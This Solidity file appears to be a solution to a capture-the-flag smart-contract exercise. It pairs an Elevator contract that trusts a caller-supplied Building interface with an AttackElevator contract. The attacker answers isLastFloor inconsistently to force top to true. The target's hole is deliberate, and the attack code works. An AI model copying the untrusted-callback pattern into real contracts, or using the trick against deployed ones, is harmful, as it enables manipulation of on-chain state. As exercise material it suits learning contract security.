// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract AttackElevator {
    uint8 public counter;
    Elevator public elevator;

    constructor(address _address) {
        elevator = Elevator(_address);
    }

    function attack(uint _floor) public {
        elevator.goTo(_floor);
    }
    
    function isLastFloor (uint _floor) external returns (bool) {                            
        if (counter == 0){
            counter += 1;
            return false;
        }
        else {
            return true;
        }
    }
}